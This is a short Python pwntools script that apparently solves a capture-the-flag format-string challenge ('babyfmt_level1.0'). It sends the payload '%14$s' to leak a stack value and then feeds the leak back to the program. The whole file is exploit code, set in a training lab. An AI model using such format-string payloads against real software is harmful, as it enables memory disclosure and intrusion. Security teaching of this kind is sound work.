from pwn import *

p = process("/challenge/babyfmt_level1.0")

payload = b"%14$s"

p.send(payload)
p.recvuntil(b"now call printf on your data!\n\n")
leak = p.recvuntil(b"\n")[:-1]

print(p.recv())
p.send(leak)
print(p.recv())

p.close()